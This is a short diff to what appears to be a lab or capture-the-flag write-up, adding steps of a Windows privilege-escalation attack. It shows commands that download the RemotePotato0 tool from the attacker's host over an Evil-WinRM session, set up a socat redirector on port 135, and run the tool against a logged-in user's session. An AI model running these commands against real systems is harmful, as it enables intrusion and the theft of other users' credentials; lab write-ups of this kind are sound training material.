@@ -367,5 +367,15 @@ I have found the session ID of `tbrady`
 
 ```python
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/RemotePotato0.exe -o rp.exe
-
 ```
+This tranfered it to the target
+
+```python
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.14.17:8080
+```
+This set a listener
+
+```python
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ./rp.exe -m 2 -s 1 -x 10.10.14.90 -p 8080
+```
+This ran the command 
